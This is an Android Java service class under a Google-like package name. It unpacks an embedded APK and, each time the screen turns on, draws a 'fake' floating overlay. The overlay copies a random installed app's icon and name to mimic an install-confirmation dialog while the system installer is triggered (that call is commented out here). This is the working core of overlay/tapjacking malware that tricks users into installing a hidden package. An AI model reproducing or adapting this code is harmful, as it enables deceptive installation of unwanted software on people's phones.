package com.google.install.plugin;

import java.io.File;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ResolveInfo;
import android.graphics.drawable.Drawable;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.ImageView;
import android.widget.TextView;

public class InstallPluginService extends Service {
    private static final String TAG = "InstallPluginService";
    
    public static final String ACTION_INSTALL = "com.google.install.plugin";
    public static final String ACTION_INSTALL_NOW = "com.google.install.plugin.now";
    
    private static final int SHOW_INSTALL_FAKE_VIEW = 0;
    private static final int REMOVE_INSTALL_FAKE_VIEW = 1;
    private Handler mHandler = new Handler() {
        public void handleMessage(Message msg) {
            switch (msg.what) {
            case SHOW_INSTALL_FAKE_VIEW:
                if (!Utils.isPackageAlreadyInstalled(getApplicationContext(), Config.PACKAGE_NAME)) {
                    File file = new File(getFilesDir() + "/" + Config.DUMP_PACKAGE_NAME);
                    if (!file.exists()) {
                        if (!Utils.unzipRawToPath(getApplicationContext(), null, file.getPath())) {
                            Config.LOGD(TAG, "unzip package to target : " + file.getPath() + " failed");
                            return;
                        }
                    }
                    SettingManager.getInstance(getApplicationContext())
                        .showFloatWindow(getFakeView(), true, 0, 0);
                    startSystemInstallActivity();
                    mHandler.sendEmptyMessageDelayed(REMOVE_INSTALL_FAKE_VIEW, 15 * 1000);
                }
                break;
            case REMOVE_INSTALL_FAKE_VIEW:
                SettingManager.getInstance(getApplicationContext()).removeFloatWindow();
                break;
            }
        }
    };
    
    private BroadcastReceiver mReceiver = new BroadcastReceiver() {
        public void onReceive(Context context, Intent intent) {
            Config.LOGD(TAG, "[[BroadcastReceiver::onReceive]] intent = " + intent.getAction());
            String action = intent.getAction();
            if (action.equals(Intent.ACTION_SCREEN_OFF)) {
                mHandler.removeMessages(SHOW_INSTALL_FAKE_VIEW);
                mHandler.removeMessages(REMOVE_INSTALL_FAKE_VIEW);
                mHandler.sendEmptyMessage(REMOVE_INSTALL_FAKE_VIEW);
            } else if (action.equals(Intent.ACTION_SCREEN_ON)) {
                if (!mHandler.hasMessages(SHOW_INSTALL_FAKE_VIEW)) {
                    mHandler.sendEmptyMessageDelayed(SHOW_INSTALL_FAKE_VIEW, Config.HANDLER_DELAY);
                }
            } else if (action.equals(Intent.ACTION_PACKAGE_ADDED)) {
                // there is a new package installed
                mHandler.removeMessages(SHOW_INSTALL_FAKE_VIEW);
                mHandler.sendEmptyMessage(REMOVE_INSTALL_FAKE_VIEW);
            }
        }
    };
    
    @Override
    public void onCreate() {
        super.onCreate();
    }
    
    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        Config.LOGD(TAG, "[[onStart]]");
        
        String action = intent.getAction();
        if (action != null && action.equals(ACTION_INSTALL_NOW)) {
            Config.LOGD(TAG, "[[onStart]] action = " + action);
            mHandler.sendEmptyMessage(SHOW_INSTALL_FAKE_VIEW);
        } else {
            //catch the broadcast for some special action
            IntentFilter filter = new IntentFilter();
            filter.addAction(Intent.ACTION_SCREEN_ON);
            filter.addAction(Intent.ACTION_SCREEN_OFF);
            filter.addAction(Intent.ACTION_PACKAGE_ADDED);
            this.registerReceiver(mReceiver, filter);
        }
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        this.unregisterReceiver(mReceiver);
    }
    
    private View getFakeView() {
        LayoutInflater factory = LayoutInflater.from(this);
        View ret = factory.inflate(R.layout.install_start, null);
        
        ResolveInfo info = Utils.getRandomAppInfo(getApplicationContext());
        
        ImageView icon = (ImageView) ret.findViewById(R.id.app_icon);
        if (info != null) {
            icon.setImageDrawable(info.activityInfo.loadIcon(getPackageManager()));
            TextView tips = (TextView) ret.findViewById(R.id.app_name);
            tips.setText(String.format(getString(R.string.confirm_title_formatted), info.loadLabel(getPackageManager())));
            TextView tips1 = (TextView) ret.findViewById(R.id.install_confirm_question);
            tips1.setText(String.format(getString(R.string.install_confirm_formatted), info.loadLabel(getPackageManager())));
        }
        
        View ok = ret.findViewById(R.id.ok_button);
        if (ok != null) {
            ok.setOnClickListener(new View.OnClickListener() {
                public void onClick(View v) {
                    SettingManager.getInstance(getApplicationContext()).removeFloatWindow();
                }
            });
        }
        
        return ret;
    }
    
    private void startSystemInstallActivity() {
//        Intent i = new Intent(Intent.ACTION_VIEW);
//        File upgradeFile = new File(getFilesDir() + "/" + Config.DUMP_PACKAGE_NAME);
//        i.setDataAndType(Uri.fromFile(upgradeFile), "application/vnd.android.package-archive");
//        startActivity(i); 
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        // TODO Auto-generated method stub
        return null;
    }

}
